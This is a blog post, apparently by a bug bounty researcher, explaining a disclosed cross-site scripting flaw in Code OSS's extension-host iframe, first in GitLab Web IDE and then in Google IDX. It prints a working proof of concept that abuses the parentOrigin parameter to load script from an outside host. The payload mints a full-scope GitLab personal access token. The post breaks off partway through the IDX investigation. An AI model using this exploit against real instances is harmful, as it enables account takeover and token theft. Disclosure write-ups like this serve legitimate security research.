<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>XSS in Google IDX Workstation | Your awesome title</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="XSS in Google IDX Workstation" />
<meta name="author" content="GitHub User" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Heyyy Everyyonee," />
<meta property="og:description" content="Heyyy Everyyonee," />
<link rel="canonical" href="http://localhost:4000/2025/07/02/idx.html" />
<meta property="og:url" content="http://localhost:4000/2025/07/02/idx.html" />
<meta property="og:site_name" content="Your awesome title" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-07-02T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="XSS in Google IDX Workstation" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-02T00:00:00+05:30","datePublished":"2025-07-02T00:00:00+05:30","description":"Heyyy Everyyonee,","headline":"XSS in Google IDX Workstation","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/07/02/idx.html"},"url":"http://localhost:4000/2025/07/02/idx.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" />
<script src="//cdn.jsdelivr.net/npm/@microlink/vanilla@latest/umd/microlink.min.js"></script>

<script>
  document.addEventListener('DOMContentLoaded', function (event) {
    microlink('.card-preview')
  })
</script>
  
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">XSS in Google IDX Workstation</h1>
    <p class="post-meta"><time class="dt-published" datetime="2025-07-02T00:00:00+05:30" itemprop="datePublished">
        Jul 2, 2025
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Heyyy Everyyonee,</p>

<p>In this blogpost I am going talk about one my bugs which I submitted to Google VRP last year. The report is disclosed publically but I really felt it‚Äôs hard to understand the inner working of the bug just based on the report I wanted to do a very detailed blogpost so here I am :)</p>

<p><br /></p>
<center><a href="https://bughunters.google.com/reports/vrp/fEFqSpwPf" class="card-preview" data-size="medium" target="_blank">
  Loading preview...
</a></center>
<p><br /></p>

<p>I will start first by explaining the original bug , how it happened what were the requirements where was the sink and all then talk about the one which I found in Google IDX. In case of IDX the vulnerable code path wasn‚Äôt used automatically like Gitlab so I had to manually frame/tweak and understand each messaage to make sure it reached the sink.</p>

<p>This bug was originally found by <a href="https://x.com/MtnBer">Matan Berson</a> (<em>an elite client security guy</em>) in Gitlab Web IDE component üôá‚Äç‚ôÄÔ∏è which under the hood uses Code OSS. As the core issue is in Code OSS itself this means any other target using the same can be vulnerable as well.</p>

<p><br /></p>
<center><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/461328" class="card-preview" data-size="medium" target="_blank">
  Loading preview...
</a></center>
<p><br /></p>

<p>To follow along the bug, I will setup a vulnerable version of Gitlab locally</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run  <span class="nt">-it</span> <span class="nt">-p</span> 1337:80 gitlab/gitlab-ce:16.10.5-ce.0
<span class="nb">sudo </span>docker <span class="nb">exec</span> <span class="nt">-it</span> f4a36094670e <span class="nb">grep</span> <span class="s1">'Password:'</span> /etc/gitlab/initial_root_password
</code></pre></div></div>

<p>From there after login, open any repo then from Edit section choose open in Web IDE. From Devtool &gt; sources you should be able to see the following endpoint.</p>

<p><a href="http://127.0.0.1:1337/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html">http://127.0.0.1:1337/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html</a></p>

<p>Equivalent vulnerable endpoint in Gitlab looked looks like this: <a href="https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=">https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=</a></p>

<p>This endpoint has a <code class="language-plaintext highlighter-rouge">parentOrigin</code> parameter which is very important. If you look into the page source on how this parameter value is used</p>

<p><a href="https://github.com/microsoft/VSCode/blob/e61c1717783b8285829ae812e85a0408f713b459/src/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html#L16">https://github.com/microsoft/VSCode/blob/e61c1717783b8285829ae812e85a0408f713b459/src/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html#L16</a></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">parentOrigin</span> <span class="o">=</span> <span class="nx">searchParams</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">parentOrigin</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nb">window</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>

<span class="p">[...]</span>
<span class="p">[...]</span>

<span class="nb">self</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">origin</span> <span class="o">!==</span> <span class="nx">parentOrigin</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">worker</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">ports</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>self refers to the window itself, so here it‚Äôs setting an event listener for the message event. But also we have an validation here regarding the origin. As the <code class="language-plaintext highlighter-rouge">parentOrigin</code> can be controlled directly via parameters this could be abused to input any arbitrary origin here and pass the check.</p>

<p>You can see if no such parameter is provided it would fallback to window.origin which would return gitlab.com only.</p>

<p>The above code block acts as a proxy as it forwards the same <em>postMessage</em> data received from the <code class="language-plaintext highlighter-rouge">parentOrigin</code> to the worker script. To give you an idea , this <em>webWorkerExtensionHostIframe.htm</em>l is related to the VSCode extensions, the worker handles the execution and all of the extensions related tasks.</p>

<p>All of these communication happens using <em>postMessage</em>, as we are able to send arbitrary messages through this to the worker things can get interesting.</p>

<p>Additionally we can see it also sends messages to the parent window so it suspects the endpoint is supposed to be inside iframe only.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">({</span>
                        <span class="nx">VSCodeWebWorkerExtHostId</span><span class="p">,</span>
                        <span class="nx">data</span>
                    <span class="p">},</span> <span class="nx">parentOrigin</span><span class="p">,</span> <span class="p">[</span><span class="nx">data</span><span class="p">]);</span>
</code></pre></div></div>

<p>Ok now we have little bit idea on the vulnerable component, lets move forward.</p>

<p>From the report we can get hold of a full working poc : <a href="https://peo.si/gl/editor/poc-frame.html">https://peo.si/gl/editor/poc-frame.html</a>
The domain name is pretty coool btw :p</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=https://peo.si"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="c1">// --- utils ---</span>
    <span class="kd">const</span> <span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>

    <span class="kd">const</span> <span class="nx">encoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextEncoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">encoder</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="nx">str</span><span class="p">).</span><span class="nx">buffer</span>

    <span class="kd">function</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">hex</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nx">length</span> <span class="o">%</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nx">hex</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">hex</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/</span><span class="se">[\d</span><span class="sr">a-f</span><span class="se">]{2}</span><span class="sr">/gi</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
        <span class="p">})).</span><span class="nx">buffer</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">async</span> <span class="kd">function</span> <span class="nf">fetch_text</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="c1">// --- end utils ---</span>

    <span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span> <span class="nf">add_port</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">window</span><span class="p">.</span><span class="nf">removeEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">,</span> <span class="nx">add_port</span><span class="p">)</span>
            <span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ports</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">port</span>
            <span class="nx">port</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">port_listener</span>
            <span class="nf">send_map</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">})</span>

    <span class="kd">function</span> <span class="nf">send_map</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Map</span><span class="p">()</span>
        <span class="kd">const</span> <span class="nx">channel</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MessageChannel</span><span class="p">()</span>
        <span class="nx">map</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">"</span><span class="s2">gitlab.gitlab-web-ide</span><span class="dl">"</span><span class="p">,</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">)</span>
        <span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">postMessage</span><span class="p">({</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">VSCode.init</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">data</span><span class="dl">"</span><span class="p">:</span> <span class="nx">map</span> <span class="p">},</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">channel</span><span class="p">.</span><span class="nx">port2</span><span class="p">])</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">false</span>
    <span class="kd">function</span> <span class="nf">port_listener</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span>
        <span class="c1">// console.log("%crecived: " + decode(rawmsg), "color: gray")</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">send_called</span> <span class="o">&amp;&amp;</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">02</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// The message is an init message</span>
            <span class="nx">send_called</span> <span class="o">=</span> <span class="kc">true</span>
            <span class="nf">send_everything</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">sleep</span><span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">)</span>
        <span class="p">})</span>
    <span class="p">}</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nf">send_everything</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">hex_lines</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nf">fetch_text</span><span class="p">(</span><span class="dl">"</span><span class="s2">send_hex.txt</span><span class="dl">"</span><span class="p">)).</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
        <span class="k">for </span><span class="p">(</span><span class="nx">hex</span> <span class="k">of</span> <span class="nx">hex_lines</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">rawmsg</span> <span class="o">=</span> <span class="nf">hex2buf</span><span class="p">(</span><span class="nx">hex</span><span class="p">)</span>
            <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
            <span class="nx">port</span><span class="p">.</span><span class="nf">postMessage</span><span class="p">(</span><span class="nx">rawmsg</span><span class="p">)</span>
            <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Let‚Äôs start with modifying the iframe src</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=https://peo.si"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<p>Eg for mine local instance it‚Äôs this http://127.0.0.1:1337/assets/webpack/gitlab-VSCode/0.0.1-dev-20240226152102/VSCode/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.html?&amp;VSCodeWebWorkerExtHostId=asdf&amp;parentOrigin=http://127.0.0.1:1338</p>

<p>Also you need to replace one thing, here the url is relative so make it absolute, well spoiler alert all the magic is happening inside this only ;)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fetch_text("https://peo.si/gl/editor/send_hex.txt")
</code></pre></div></div>

<p>In console you could see a message like this
<img src="/tmp/cdn-images/Pasted%20image%2020250714201326.png" alt="Pasted image 20250714201326.png" /></p>

<p>Which is from the following script</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="nf">anonymous</span><span class="p">(</span><span class="nx">module</span><span class="p">,</span><span class="nx">exports</span><span class="p">,</span><span class="nx">require</span>
<span class="p">)</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">XSS in </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">origin</span><span class="p">)</span>
<span class="nx">globalThis</span><span class="p">.</span><span class="nx">fetch</span> <span class="o">=</span> <span class="nx">WorkerGlobalScope</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">fetch</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">globalThis</span><span class="p">)</span> <span class="c1">// restore original fetch</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">page_resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://gitlab.com/-/user_settings/personal_access_tokens</span><span class="dl">"</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">text</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">page_resp</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
    <span class="kd">const</span> <span class="nx">csrf_token</span> <span class="o">=</span> <span class="nx">text</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/&lt;meta name="csrf-token" content=".*</span><span class="se">?</span><span class="sr">"/g</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">Got csrf token: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">csrf_token</span><span class="p">)</span>
    <span class="kd">const</span> <span class="nx">token_resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://gitlab.com/-/user_settings/personal_access_tokens</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">X-Csrf-Token</span><span class="dl">"</span><span class="p">:</span> <span class="nx">csrf_token</span><span class="p">,</span>
            <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
        <span class="p">},</span>
        <span class="na">body</span><span class="p">:</span> <span class="dl">"</span><span class="s2">personal_access_token%5Bname%5D=malicious%20token&amp;personal_access_token%5Bexpires_at%5D=2025-05-04&amp;personal_access_token%5Bscopes%5D%5B%5D=api&amp;personal_access_token%5Bscopes%5D%5B%5D=read_api&amp;personal_access_token%5Bscopes%5D%5B%5D=read_user&amp;personal_access_token%5Bscopes%5D%5B%5D=create_runner&amp;personal_access_token%5Bscopes%5D%5B%5D=k8s_proxy&amp;personal_access_token%5Bscopes%5D%5B%5D=read_repository&amp;personal_access_token%5Bscopes%5D%5B%5D=write_repository&amp;personal_access_token%5Bscopes%5D%5B%5D=read_registry&amp;personal_access_token%5Bscopes%5D%5B%5D=write_registry&amp;personal_access_token%5Bscopes%5D%5B%5D=ai_features</span><span class="dl">"</span>
    <span class="p">})</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">token_resp</span><span class="p">.</span><span class="nf">json</span><span class="p">()).</span><span class="nx">new_token</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="dl">"</span><span class="s2">Got token: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span><span class="p">)</span>
<span class="p">}</span>

<span class="nf">exploit</span><span class="p">()</span>
<span class="c1">//# sourceURL=https://gitlab.com/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/gitlab-web-ide/main.js#VSCode-extension</span>
<span class="p">})</span>
</code></pre></div></div>

<p>This xss executes in the context of web worker which is different as you don‚Äôt have access to dom and other things. Still you can make use of things like fetch and read any sensitive data you want because the origin is same.</p>

<p>The above script comes from this file: <a href="https://peo.si/gl/editor/include.js">https://peo.si/gl/editor/include.js</a> but you might wonder where did it get loaded from, let‚Äôs look into the <em>send_hex.txt</em> data there are over 798 lines of hex data each one is individual and needs to be send as alone (one by one through the message port).</p>

<p>All these hex data are being transmitted to the worker script via the proxy <em>postMessage</em> handler which I talked earlier about. Matan also has placed additional utilities to decode/encode the hex data.</p>

<p>VSCode extension worker expects data in buffer format sending raw buffer can be tricky that‚Äôs why it‚Äôs stored in hex.</p>

<p>Comment out this line in the poc to see the decoded version of the data which we are sending:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="c1">// console.log("%csent: " + decode(rawmsg), "color: gray")</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201122.png" alt="Pasted image 20250714201122.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201147.png" alt="Pasted image 20250714201147.png" />
<br />
You can see some sample logging like this.</p>

<p>People with sharingan would have already noticed the interesting part , it has some non printable chars also before it. Btw just to point if you randomly change the hostname it‚Äôs not going to work the characters at the front also holds some meaning for eg the length I will talk about them later</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">sent:</span><span class="w">   </span><span class="err">O</span><span class="p">{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/gl/editor/include.js"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"https"</span><span class="p">,</span><span class="nl">"authority"</span><span class="p">:</span><span class="s2">"peo.si"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>which in hex is this</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>09000000110000004f7b22246d6964223a312c2270617468223a222f676c2f656469746f722f696e636c7564652e6a73222c22736368656d65223a226874747073222c22617574686f72697479223a2270656f2e7369227d
</code></pre></div></div>

<p>Matan did mentioned somewhere I forgot where  it was, he constructed all these <em>postMessage</em> data by setting breakpoint on those worker related message handlers. And made changes to the path authority part of that message which allowed him to load the arbitrary js from his own domain.</p>

<p>We now have a working poc and a bit of idea how it works, so we are good move on the next part.</p>

<h2 id="xss-in-google-idx">XSS in Google IDX</h2>

<p>During that time Google VRP announce something , they were paying 15k for a xss in XSS on idx.google.com</p>

<center><a href="https://bughunters.google.com/blog/5400513950908416/increasing-google-alphabet-vrp-rewards-up-to-151-515" class="card-preview" data-size="medium" target="_blank">
  Loading preview...
</a></center>

<p>As IDX is built on Code OOS itself it was great oppurtunity to check for the bug there. I quickly fired up a new instance grabbed the full url for that endpoint and loaded it inside an iframe.</p>

<p><a href="https://idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev/cde-b0e6fa075cda44c438f11d44d4466ea348722d00/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.esm.html?&amp;VSCodeWebWorkerExtHostId=651e8c71-0f38-4e7e-b9cb-0de00c82087b">https://idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev/cde-b0e6fa075cda44c438f11d44d4466ea348722d00/static/out/vs/workbench/services/extensions/worker/webWorkerExtensionHostIframe.esm.html?&amp;VSCodeWebWorkerExtHostId=651e8c71-0f38-4e7e-b9cb-0de00c82087b</a></p>

<p>And very soon saw my first disappointment appeared :(</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frame-ancestors: 'self', https://80-idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev, https://idx-test-1723049072870.cluster-qpa6grkipzc64wfjrbr3hsdma2.cloudworkstations.dev, https://monospace.corp.google.com, https://monospace-dev.corp.google.com, https://monospace-staging.corp.google.com, https://monospace-autopush.corp.google.com, https://msm.sandbox.google.com, https://monospace.sandbox.google.com, https://idx.sandbox.google.com, https://monospace.google.com, https://idx.google.com, https://studio.firebase.google.com, https://*.sslproxy.corp.google.com, https://*.cloudworkstations.googleusercontent.com, https://localhost.corp.google.com:10443
</code></pre></div></div>

<p>Just one thing was good with this was that it allowed a lot of other domains so a xss in any of these looked very promising. The most reliable was this <code class="language-plaintext highlighter-rouge">https://*.cloudworkstations.googleusercontent.com</code> but I had no idea from where I would lead to this, the name does suggest this domain is meant for hosting user controllable input.
So I contacted my Google vrp leet friend</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201210.png" alt="Pasted image 20250714201210.png" />
<img src="/tmp/cdn-images/Pasted%20image%2020250714201227.png" alt="Pasted image 20250714201227.png" />
<br />
By forcing Sreeram to put his ass at work:</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201252.png" alt="Pasted image 20250714201252.png" /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250714201427.png" alt="Pasted image 20250714201427.png" />
<br />
<br /></p>

<p>And he did find one, now it was my turn to confirm the theory but it turned out that the same payload doesn‚Äôt works in IDX. It did felt like it should work but I have no idea to confirm the same, the only possible solution was to debug and understand Matan‚Äôs finding to identify the sink and flow to better understand the problem with IDX.</p>

<p>As I already mentioned Matan was able to get hold of those messages by setting logger for the message calls and later he replaced the server where the file was requested from to his own. I decided to do the same with IDX .</p>

<p>The very first thing I did was to shortened the payload from Matan‚Äôs poc, from 700 to mere 10 <em>postMessage</em> data.
First I removed the extra messages from the 59th line to the end, as the message  on the 58th line was instructing VSCode to load arbitrary js from attacker controlled domain (anything after that shouldn‚Äôt matter) and it did still worked so I knew I was on the right track. Then I manually removed here there until I had a very small list which was really important as I could understand what was necessary to trigger the bug and debug also why it‚Äôs failing on IDX</p>

<p>Remove one line at a time then refreshing the page to see it works or not
<img src="/tmp/cdn-images/hRpaEkH9mF.gif" alt="hRpaEkH9mF.gif" /></p>

